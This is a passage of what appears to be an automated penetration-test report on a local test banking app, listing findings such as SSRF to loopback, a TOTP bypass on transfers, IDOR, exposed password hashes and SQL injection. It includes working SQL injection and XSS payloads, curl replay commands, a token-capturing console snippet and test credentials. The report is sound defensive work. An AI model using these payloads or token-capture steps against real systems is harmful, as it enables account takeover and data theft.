Six consecutive POST requests to `/api/admin/auth/login` used username `admin` with the same incorrect password. All returned HTTP 401 with the same `INVALID_CREDENTIALS` response. Attempt 1 took 69 ms and attempt 6 took 73 ms; attempts 2-5 took 62-79 ms.
```

### Request Evidence
```
Six consecutive POST requests to `/api/admin/auth/login` used username `admin` with the same incorrect password.
```

### Response Evidence
```
Attempt 1: HTTP 401, 69 ms. Attempt 6: HTTP 401, 73 ms. Attempts 2-5 were also HTTP 401 with the same body, taking 62-79 ms.
```

### Validation Note
The endpoint is necessarily public for authentication, but that does not explain the lack of brute-force controls. I sent six more anonymous POSTs for the known admin account after the scanner's six attempts; all six still returned the same 401 INVALID_CREDENTIALS response in 75-81 ms, with no lockout, throttling response, or measurable delay. No benign explanation for the missing rate limit appeared in the bounded 12-attempt check.

## 8. Avatar import fetches user-supplied URLs

- Finding reference: RIAG-006
- Severity: medium
- OWASP: A10:2021 – Server-Side Request Forgery (SSRF)
- Source: specialist agent
- Validation: confirmed
- Affected URL: http://localhost:8081/api/profile/avatar
- CVSS: 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

### Description
The authenticated POST /api/profile/avatar endpoint accepts a caller-supplied URL. The server fetched https://example.com and returned the fetched HTML document in the avatar_data response field as a data URI.

### Impact
An authenticated attacker could make the server request chosen destinations and read the returned content. This could expose internal services or metadata if those destinations are reachable, though no internal destination was tested.

### Likelihood
The request requires an account. A request to the public https://example.com URL confirmed that the server fetched the destination and returned its response body.

### Recommendation
Allow only approved image formats and destinations. Restrict URL schemes and destinations with an allowlist, resolve and reject loopback, private, link-local, and metadata IP ranges for IPv4 and IPv6, and repeat checks after redirects. Apply outbound network controls and do not return fetched non-image content as data URIs.

### Evidence
```
An authenticated POST to /api/profile/avatar with {"url":"https://example.com"} returned HTTP 200 with avatar_data containing a data:text/html;base64 URI for the Example Domain HTML, size 559, and source_url https://example.com.
```

### Request Evidence
```
POST /api/profile/avatar with Authorization: Bearer <test-account token> and JSON body {"url":"https://example.com"}.
```

### Response Evidence
```
HTTP 200, response includes avatar_data data:text/html;base64 with the fetched Example Domain HTML, size 559, and source_url https://example.com.
```

### Validation Note
The public URL baseline succeeds, and changing only the supplied URL to http://127.0.0.1:8081/ returns HTTP 200 with the app's own "The Bank of Ed - Banking Without Borders" page embedded in avatar_data. This confirms a real server-side fetch to loopback and in-band return of the response; the loopback destination is not rejected. Requests to link-local metadata and loopback port 80 failed, but that does not explain the successful loopback fetch on port 8081.

## 9. Login accepts repeated password failures without throttling

- Finding reference: RIAG-003
- Severity: medium
- OWASP: A07
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/auth/login
- CVSS: 6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

### Description
The login endpoint at `/api/auth/login` accepted six consecutive attempts with an incorrect password for the same known disposable account. All returned the same HTTP 401 `WRONG_PASSWORD` response, with no observable captcha, lockout, delay, or rate-limit response.

### Impact
An attacker could automate password-guessing or credential-stuffing attempts against account email addresses without the observed requests being slowed or blocked.

### Likelihood
The bounded test confirmed six consecutive failed attempts completed without an observable throttling control. This supports repeated attempts in the tested context, but does not establish how the endpoint behaves beyond those six requests.

### Recommendation
Apply rate limits per account and source, add increasing delays, and use temporary lockout or step-up verification after repeated failures. Keep login errors consistent and monitor repeated failures.

### Evidence
```
Six consecutive POST requests used the same known disposable email and an incorrect password. Attempts 1-6 all returned HTTP 401 with `{"success":false,"error":{"code":"WRONG_PASSWORD","message":"Incorrect password."}}`; response times ranged from 5-12 ms, with no observable throttling.
```

### Request Evidence
```
Six consecutive POST requests to `/api/auth/login` used the same known disposable email and an incorrect password.
```

### Response Evidence
```
Attempt 1: HTTP 401 WRONG_PASSWORD, 9 ms. Attempt 6: HTTP 401 WRONG_PASSWORD, 10 ms. Attempts 2-5 were also HTTP 401 with the same body, and durations were 5-12 ms.
```

### Validation Note
I ran two bounded sequences of six wrong-password POSTs against the listed account, using its provided session label; the request evidence shows no Authorization header or cookies were sent. The responses stayed 401 WRONG_PASSWORD through the follow-up sequence, with no lockout, captcha, or rate-limit response. Login being public is expected, but it does not explain the lack of throttling. A single request cannot reproduce the repeated-attempt condition, so I am omitting a PoC request.

## 10. Manual transfers bypass the required TOTP check

- Finding reference: RIAG-023
- Severity: medium
- OWASP: A07
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transfers/external
- CVSS: 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)

### Description
The transfer check says manual transfers require TOTP, but the external transfer endpoint completes a manual transfer without TOTP verification.

### Impact
An authenticated user can complete a manual transfer without the additional verification the application says is required.

### Likelihood
The check returned requires_totp=true. A subsequent authenticated transfer returned 201 with status completed and totp_verified=false.

### Recommendation
Enforce the TOTP requirement in the transfer endpoint before processing or debiting funds. Add tests that reject manual transfers without a valid TOTP.

### Evidence
```
POSTing a manual transfer as logic_user returned 201, "status":"completed", and "totp_verified":false, after the check endpoint reported that TOTP was required.

REQUEST:
POST http://localhost:8081/api/transfers/external
use_session: anonymous  Authorization: none
Cookies: none
{}
{}

RESPONSE:
Status: 401
date: Tue, 22 Sep 2026 23:51:37 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 102
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"UNAUTHORIZED","message":"Missing or invalid Authorization header."}}
```

### Request Evidence
```
POST http://localhost:8081/api/transfers/external
use_session: anonymous  Authorization: none
Cookies: none
{}
{}
```

### Response Evidence
```
Status: 401
date: Tue, 22 Sep 2026 23:51:37 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 102
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"UNAUTHORIZED","message":"Missing or invalid Authorization header."}}
```

### Validation Note
The anonymous request is correctly rejected, so this is not an unauthenticated-access issue. With the named logic_user session, the transfer check returned requires_totp=true; a one-cent manual external transfer with no TOTP code then returned 201 with status=completed and totp_verified=false, so the checker’s policy is not enforced by the transfer endpoint.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' --data-raw '{"from_account_id":101,"amount":0.01,"to_bsb":"062-000","to_account_number":"00000000"}' http://localhost:8081/api/transfers/external -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **logic_user** or an equivalent user).

Log in as logic_user and copy the bearer token from the Authorization header in the browser's Network tab.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 11. Profile endpoint exposes the password hash

- Finding reference: RIAG-014
- Severity: medium
- OWASP: A02
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/profile
- CVSS: 4 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

### Description
An authenticated GET to `/api/profile` returns the account’s password hash alongside profile data. The client does not need this credential verifier to display profile fields.

### Impact
Anyone who obtains the response can attempt to crack the hash offline. If successful, this could expose the account password, especially if it is reused.

### Likelihood
The recorded request returned HTTP 200 with the hash, but retrieving it requires a valid bearer token. The evidence does not show unauthenticated access.

### Recommendation
Remove `password_hash` from profile and user responses. Return only fields the client needs, and add response-schema tests to ensure credential fields are excluded.

### Evidence
```
The recorded authenticated GET `/api/profile` returned HTTP 200. Its JSON user object included `"password_hash":"$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi"` alongside email, address, and TOTP flags.
```

### Request Evidence
```
GET `/api/profile` with an Authorization: Bearer token succeeded with HTTP 200.
```

### Response Evidence
```
Response JSON included the account's email, address, TOTP flags, and `password_hash`.
```

### Validation Note
I re-ran the authenticated GET with the supplied `admin` session and received HTTP 200 with `password_hash` in the live JSON profile. A second supplied active session returned the same profile and hash, so the scanner result is not a stale export or log; the successful responses identify the profile as Amelia Chen. The field is a bcrypt-formatted credential verifier returned with ordinary profile fields, and I found no benign response transformation or omission that explains the disclosure.

## 12. Profile endpoint exposes the password hash

- Finding reference: RIAG-024
- Severity: medium
- OWASP: A02
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/auth/login
- CVSS: 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

### Description
A successful login response includes the user's password_hash at http://localhost:8081/api/auth/login.

### Impact
A person with access to the response can attempt to crack the hash offline and reuse the password elsewhere.

### Likelihood
Any user who can sign in receives the hash. Exploitation requires access to that user's response, and cracking depends on the hash algorithm and password strength.

### Recommendation
Remove password_hash and other authentication secrets from login responses. Use an explicit response schema that returns only required user fields.

### Evidence
```
The successful login response for user 23 includes "password_hash":"6dffd4f2d5c66e40469390aa5e5fbb71" and "totp_secret":null.

REQUEST:
POST http://localhost:8081/api/auth/login
use_session: (default)  Authorization: present
Cookies: none
{}
{"email": "aespa.logic.923@example.test", "password": "SafeTestPass123!"}

RESPONSE:
Status: 200
date: Tue, 22 Sep 2026 23:56:43 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 668
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"user":{"id":23,"email":"aespa.logic.923@example.test","first_name":"<img src=x onerror=\"document.body.setAttribute('data-xss-canary','profile-name-923')\">","last_name":"Test","address_line1":null,"address_line2":null,"suburb":null,"state":null,"postcode":null,"phone":null,"avatar_url":null,"totp_enabled":false,"password_hash":"6dffd4f2d5c66e40469390aa5e5fbb71","totp_secret":null},"token":"[REDACTED_JWT]"},"message":"Login successful"}
```

### Request Evidence
```
POST http://localhost:8081/api/auth/login
use_session: (default)  Authorization: present
Cookies: none
{}
{"email": "aespa.logic.923@example.test", "password": "SafeTestPass123!"}
```

### Response Evidence
```
Status: 200
date: Tue, 22 Sep 2026 23:56:43 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 668
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"user":{"id":23,"email":"aespa.logic.923@example.test","first_name":"<img src=x onerror=\"document.body.setAttribute('data-xss-canary','profile-name-923')\">","last_name":"Test","address_line1":null,"address_line2":null,"suburb":null,"state":null,"postcode":null,"phone":null,"avatar_url":null,"totp_enabled":false,"password_hash":"6dffd4f2d5c66e40469390aa5e5fbb71","totp_secret":null},"token":"[REDACTED_JWT]"},"message":"Login successful"}
```

### Validation Note
I repeated the supplied POST /api/auth/login request against the live endpoint and received HTTP 200 with the same user's password_hash field and the same 32-character value in the JSON response. This is not a scanner parsing artifact or static/debug output; the hash is returned in the successful login response. The guessed /api/auth/me route returned 404, which does not change the direct reproduction. I cannot include a PoC request without copying the active login password from the evidence, so I have omitted it rather than put a password in the report.

## 13. Registration accepts one-character passwords

- Finding reference: RIAG-002
- Severity: medium
- OWASP: A07
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/auth/register
- CVSS: 6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

### Description
The registration API at /api/auth/register accepts a one-character password. The minimum-length check shown in the browser form is not enforced by the server.

### Impact
Users who choose very short passwords have accounts that are easier to compromise through password guessing.

### Likelihood
High that an attacker can register with a one-character password: the API accepted the test password without additional validation. Compromise of another user's account depends on that user choosing a similarly weak password.

### Recommendation
Enforce a meaningful minimum password length in the registration API, and reject common passwords. Do not rely on client-side minlength checks.

### Evidence
```
A POST to /api/auth/register with a unique disposable email and password "a" returned HTTP 201 with "message":"Registration successful" and a new user record.
```

### Request Evidence
```
The test request used a one-character password, `a`.
```

### Response Evidence
```
HTTP 201 with success true and a new user record.
```

### Validation Note
The supplied scan evidence reports a complete registration with password "a" returning 201 and creating a user, which directly demonstrates that this value passes server-side registration. My safe check with the listed existing identity reached the duplicate-email 409 before password validation; the initial incomplete request stopped on missing name fields, so neither provides an innocent explanation. I did not create another account to replay the scan, and the exact successful request body was not included, so I cannot give a reliable PoC request.

## 14. TOTP setup verification has no observed throttling

- Finding reference: RIAG-012
- Severity: medium
- OWASP: A07
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/profile/totp/verify
- CVSS: 4.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N)

### Description
The TOTP setup verification endpoint accepted six consecutive invalid codes without observed throttling or increasing delay. The test used an authenticated session and did not confirm a successful code guess.

### Impact
If an attacker with an authenticated session guesses a valid code while setup is pending, they may be able to enroll an authenticator they control. No successful guess was observed.

### Likelihood
The six tested requests completed in 12-19 ms with the same invalid-code response, suggesting initial guesses are not slowed. The test did not establish how the endpoint behaves after more attempts.

### Recommendation
Apply per-account and per-source attempt limits, progressive delays, and temporary lockouts to TOTP setup verification. Bind setup to the user's session and clear pending secrets after repeated failures.

### Evidence
```
Six consecutive POST requests with the same incorrect code returned HTTP 403 `TOTP_INVALID`. Attempts 1 and 6 returned the same error body, and observed durations stayed between 12 and 19 ms.
```

### Request Evidence
```
Six consecutive requests on one disposable account used the same incorrect six-digit code.
```

### Response Evidence
```
Attempt 1 and attempt 6 both returned `{"success":false,"error":{"code":"TOTP_INVALID","message":"Invalid TOTP code. Please try again."}}`; observed durations stayed between 12 and 19 ms.
```

### Validation Note
Using the listed otp_user session, I sent three bounded batches of six correctly formed invalid totp_code values to the verification endpoint. The responses remained HTTP 403 TOTP_INVALID at 13-15 ms through 18 consecutive failures, with no 429/lockout response or increasing delay. This rules out a throttle that merely starts after the scanner's six-request sample; the endpoint allowed continued rapid guessing.

## 15. Transaction details are accessible across accounts

- Finding reference: RIAG-017
- Severity: medium
- OWASP: A01
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transactions/1
- CVSS: 4.6 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

### Description
An authenticated user can request a transaction by ID without an ownership check. The endpoint returned transaction 1 to user ID 23, whose own transaction list showed records for account 101, while the returned transaction referenced account 1.

### Impact
An authenticated attacker could enumerate transaction IDs and view other customers’ financial activity, including transaction amounts, account references, descriptions, and timestamps.

### Likelihood
The endpoint accepted a request for transaction ID 1 using the disposable authenticated session. The finding reports that transaction IDs are numeric and sequential, making other IDs straightforward to try.

### Recommendation
Restrict transaction lookups to records associated with an account the authenticated user owns. Apply the ownership scope in the database query, and return an authorization failure when the transaction is outside that scope.

### Evidence
```
Using the disposable logic_user_fresh session for user ID 23, GET /api/transactions/1 returned HTTP 200 with transaction 1, from_account_id 1, to_account_id 2, amount 500.00, description “Monthly savings,” and timestamp 2026-01-05 09:12:00. The user’s own transaction list showed records for account 101.
```

### Request Evidence
```
GET http://localhost:8081/api/transactions/1 with Bearer session logic_user_fresh (user ID 23).
```

### Response Evidence
```
HTTP 200: {"success":true,"data":{"id":1,"from_account_id":1,"to_bsb":"062-001","to_account_number":"10000002","to_account_id":2,"amount":"500.00","description":"Monthly savings","transfer_type":"own","status":"completed","created_at":"2026-01-05 09:12:00"},"message":"OK"}
```

### Validation Note
The anonymous request was rejected with 401, so the transaction is not intentionally public. With the listed logic_user_fresh session, /api/accounts showed accounts 101, 102, 104, 106, 107, and 108, while /api/transactions showed only that user's transactions; neither account 1 nor 2 was among the user's accounts. The same session nevertheless received transaction 1, including its amount and description, so the returned record belongs outside this user's account scope.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 http://localhost:8081/api/transactions/1 -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **logic_user_fresh** or an equivalent user).

Log in as the disposable logic user (user ID 23), then copy the bearer token from localStorage/sessionStorage or the Authorization header in the browser's Network tab.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 16. Registration returns an MD5 password hash

- Finding reference: RIAG-001
- Severity: medium
- OWASP: A02
- Source: Dynamic
- Validation: unconfirmed
- Affected URL: http://localhost:8081/api/auth/register
- CVSS: 6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

### Description
The registration endpoint accepted the one-character password `a` and returned its password hash in the HTTP 201 response. The returned value, `0cc175b9c0f1b6a831c399e269772661`, matches the unsalted MD5 digest of `a`, indicating use of a fast hash unsuitable for password storage.

### Impact
If the user database or response data is exposed, an attacker could crack MD5 hashes quickly and try recovered passwords on other services. Returning the hash also exposes an unnecessary credential verifier.

### Likelihood
The endpoint is remotely accessible and returned the hash during registration. Cracking or password reuse would depend on an attacker obtaining the database or response data.

### Recommendation
Use a password hashing function designed for credentials, such as Argon2id or bcrypt with appropriate work factors and per-password salts. Do not include password hashes in API responses.

### Evidence
```
A POST to /api/auth/register with password `a` returned HTTP 201 and `password_hash":"0cc175b9c0f1b6a831c399e269772661"`, matching MD5(`a`).
```

### Request Evidence
```
POST /api/auth/register body included `"password":"a"`.
```

### Response Evidence
```
HTTP 201 response included `"password_hash":"0cc175b9c0f1b6a831c399e269772661"`.
```

### Validation Note
I sent the registration fields with an existing account email. The endpoint first returned 422 for missing first_name and last_name, then returned 409 DUPLICATE_ENTRY once those fields were supplied, so no account was created and no password hash was returned. The scanner's reported 201 response and MD5 value could not be independently checked because it did not include the successful request body, and safely obtaining another 201 would require creating a new account; I therefore cannot confirm whether that response was live or whether the returned digest was the stored password hash.

## 17. Login errors reveal whether an email has an account

- Finding reference: RIAG-007
- Severity: low
- OWASP: A07
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/auth/login
- CVSS: 3.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

### Description
The login endpoint returns different error codes and messages for a known account with an incorrect password and an unregistered email, revealing whether an email address has an account.

### Impact
An attacker can identify registered email addresses for targeted phishing or credential-stuffing attempts.

### Likelihood
The distinction was observed in one comparison using a disposable account and a synthetic nonexistent address. The responses make account checks practical, but the evidence does not establish broader exposure or rate-limit behaviour.

### Recommendation
Return the same generic authentication error for unknown users and incorrect passwords. Keep response timing similar for both cases.

### Evidence
```
POST requests to `/api/auth/login` with the same wrong password returned HTTP 401 with `WRONG_PASSWORD` and `Incorrect password.` for `aespa.weakpass.923@example.test`, and `USER_NOT_FOUND` and `No account found with this email address.` for `no-such-user-923@example.test`.
```

### Request Evidence
```
Known user: `aespa.weakpass.923@example.test` with a wrong password. Unknown user: `no-such-user-923@example.test` with the same wrong password.
```

### Response Evidence
```
Known user: `{"code":"WRONG_PASSWORD","message":"Incorrect password."}`. Unknown user: `{"code":"USER_NOT_FOUND","message":"No account found with this email address."}`.
```

### Validation Note
I repeated both requests anonymously with the same wrong password and no cookies or authorization header. The registered address returned `WRONG_PASSWORD` / `Incorrect password.`, while the unregistered address returned `USER_NOT_FOUND` / `No account found with this email address.`; the distinct response directly discloses account existence, and an intentionally public login endpoint does not explain away that disclosure.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"email":"aespa.weakpass.923@example.test","password":"wrong-password-923"}' http://localhost:8081/api/auth/login
```

## 18. Missing browser security headers on the admin page

- Finding reference: RIAG-004
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/admin/
- CVSS: 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

### Description
The unauthenticated `/admin/` response is reported to omit Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, and Referrer-Policy. It also exposes the Apache server version.

### Impact
Without these headers, browsers lack protections against framing and MIME sniffing, and a future script-injection flaw would not be constrained by a CSP. The disclosed server version may help an attacker identify the server software.

### Likelihood
The headers were absent from the observed HTTP 200 response. The evidence does not show that an attacker can frame the page or exploit a separate injection flaw.

### Recommendation
Set a restrictive Content-Security-Policy, X-Content-Type-Options: nosniff, and an appropriate Referrer-Policy. Prevent framing with CSP frame-ancestors or X-Frame-Options, and avoid exposing detailed server versions.

### Evidence
```
The captured evidence describes an unauthenticated GET /admin/ returning HTTP 200 text/html with `Server: Apache/2.4.68 (Unix)` and no CSP, X-Frame-Options, X-Content-Type-Options, or Referrer-Policy.
```

### Request Evidence
```
Unauthenticated GET /admin/.
```

### Response Evidence
```
HTTP 200 text/html with Apache version header and no listed browser security headers.
```

### Validation Note
A direct unauthenticated GET to the reported URL returned HTTP 200 from Apache/2.4.68 (Unix), with none of the four reported security response headers. The response is the admin HTML page, and its document head starts with only charset and viewport metadata; no header-based or meta-tag equivalent was observed to cover the missing protections. This reproduces the reported misconfiguration rather than showing proxy stripping or a login redirect.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 http://localhost:8081/admin/
```

## 19. Missing browser security headers on the banking page

- Finding reference: RIAG-005
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/banking/
- CVSS: 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

### Description
The unauthenticated banking page at `/banking/` returned HTTP 200 without Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, or Referrer-Policy. The observation also reports a `Server: Apache/2.4.68 (Unix)` header.

### Impact
The missing headers reduce browser-side protections. Framing may allow clickjacking, and without a Content-Security-Policy, injected scripts would not be constrained by that policy. Neither attack was demonstrated.

### Likelihood
The headers were absent in the observed unauthenticated HTTP 200 response. Exploitation of the potential impacts was not demonstrated.

### Recommendation
Set a restrictive Content-Security-Policy and use `frame-ancestors` or X-Frame-Options to control framing. Set `X-Content-Type-Options: nosniff` and an appropriate Referrer-Policy. Avoid exposing detailed server versions.

### Evidence
```
The captured observation states that unauthenticated `GET /banking/` returned HTTP 200, exposed `Server: Apache/2.4.68 (Unix)`, and lacked Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, and Referrer-Policy.
```

### Request Evidence
```
Unauthenticated GET /banking/.
```

### Response Evidence
```
HTTP 200 text/html with Apache version header and no listed browser security headers.
```

### Validation Note
I repeated an unauthenticated GET directly to the reported URL. It returned the complete response header set with no CSP, X-Frame-Options, X-Content-Type-Options, or Referrer-Policy; the HTML head also has no meta-based CSP or referrer-policy. That rules out proxy stripping and the suggested meta-policy explanation, and the page serves active banking UI content, so there is no concrete benign explanation for leaving all these browser protections unset.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 http://localhost:8081/banking/
```

## 20. SQL injection in admin customer search

- Finding reference: RIAG-009
- Severity: low
- OWASP: A03
- Source: specialist agent
- Validation: confirmed
- Affected URL: http://localhost:8081/api/admin/customers?page=1&per_page=15&search=%27%20OR%20%271%27=%271--%20
- CVSS: 2.5 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N)

### Description
The `search` parameter on the admin customer search endpoint is interpreted as SQL syntax. A boolean expression bypassed the requested search term and returned customer records.

### Impact
An attacker with an admin account can make the search return customers outside the requested term. The captured evidence demonstrates broader search results, but not database access beyond this endpoint or data modification.

### Likelihood
The payload was accepted in an admin session and changed the result set. Exploitation therefore requires access to an admin account.

### Recommendation
Use parameterized SQL or ORM query expressions for search filters. Do not concatenate user input into SQL text.

### Evidence
```
The request using `search=' OR '1'='1--` returned HTTP 200 with 15 customer rows and a pagination total of 24. The response included customer id 16 (`face@example.com`, `FACE Insurance`). The baseline search `NoSuchTest923` returned 0 customers.
```

### Request Evidence
```
GET /api/admin/customers?page=1&per_page=15&search=%27%20OR%20%271%27=%271--%20 using the admin_fresh session.
```

### Response Evidence
```
HTTP 200; response JSON contained "customers":[...], "total":24, "total_pages":2.
```

### Validation Note
The clean no-match search returned 200 with zero rows, while the reported OR payload returned 15 customer records. A separate lone-apostrophe request returned a MariaDB SQLSTATE 1064 syntax error, with the database trace identifying PDO->query() in AdminUserController.php; this is a payload-dependent database error, not a hardcoded search message or benign broad-search fallback.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 'http://localhost:8081/api/admin/customers?page=1&per_page=15&search=%27' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin** or an equivalent user).

Log in as the admin user, then copy the bearer token from the Authorization header in the browser DevTools Network tab and supply it when replaying the request.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 21. SQL injection in admin customer search

- Finding reference: RIAG-013
- Severity: low
- OWASP: A03
- Source: specialist agent
- Validation: confirmed
- Affected URL: http://localhost:8081/api/admin/customers?page=1&per_page=1&search=%27%20OR%20LOAD_FILE%28%27%2Fetc%2Fpasswd%27%29%20IS%20NOT%20NULL--%20
- CVSS: 2.5 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N)

### Description
The `search` parameter on `/api/admin/customers` accepts an injected SQL expression. The captured `LOAD_FILE('/etc/passwd') IS NOT NULL` condition evaluated true, confirming the database could read that host file.

### Impact
An authenticated admin could use the injection to change the customer search results. The captured request returned all 24 customer records despite `per_page=1`. The file-read probe confirmed only that `/etc/passwd` was readable; it did not return the file contents.

### Likelihood
High for a user with admin access: the injected condition was evaluated by the endpoint and returned customer rows.

### Recommendation
Use parameterized queries for all search values and restrict the database account's `FILE` privilege unless it is required. Avoid returning detailed SQL errors to clients.

### Evidence
```
The request used `search=' OR LOAD_FILE('/etc/passwd') IS NOT NULL-- ` with `per_page=1`. It returned HTTP 200 and all 24 customer records, beginning with `amelia.chen@example.com`. The injected comment also removed the pagination constraint. The response confirms the condition evaluated true but contains no `/etc/passwd` contents.
```

### Request Evidence
```
GET /api/admin/customers?page=1&per_page=1&search=%27%20OR%20LOAD_FILE%28%27%2Fetc%2Fpasswd%27%29%20IS%20NOT%20NULL--%20 using admin_fresh.
```

### Response Evidence
```
HTTP 200; response JSON began with "customers":[{"id":1,"email":"amelia.chen@example.com"... and continued with all 24 records. The LOAD_FILE non-null predicate therefore evaluated true.
```

### Validation Note
With a valid admin session, a normal search for Amelia returned one row at per_page=1, while the reported payload returned additional customer rows, including Wei, despite the same pagination limit. A no-match search returned an empty list, so the extra rows are specific to the injected input and not the endpoint's ordinary behavior. The true and false boolean controls returned the same broad result, so they do not prove that LOAD_FILE('/etc/passwd') itself was evaluated or that file contents were read; they do not explain away the payload-driven SQL filter and pagination bypass.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 'http://localhost:8081/api/admin/customers?page=1&per_page=1&search=%27%20OR%20LOAD_FILE%28%27%2Fetc%2Fpasswd%27%29%20IS%20NOT%20NULL--%20' -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **admin_fresh** or an equivalent user).

Log in as the admin user represented by admin_fresh and copy the bearer token from the Authorization header in the DevTools Network panel.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 22. Admin API reflects untrusted origins with credentialed CORS

- Finding reference: RIAG-015
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: false_positive
- Affected URL: http://localhost:8081/api/admin/customers/2
- CVSS: 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

### Description
The admin customers endpoint at `/api/admin/customers/2` reflects an untrusted `Origin` value and allows credentials in its CORS response. The response included customer and account details.

### Impact
A malicious origin could read sensitive API responses if a victim has a browser session that sends credentials to this endpoint. The frontend uses bearer tokens in localStorage, and cross-origin browser access to authenticated data was not demonstrated.

### Likelihood
The server returned the reflected origin and allowed credentials for a request made with an authenticated admin session. Exploitation from a victim's browser was not confirmed in the observed setup.

### Recommendation
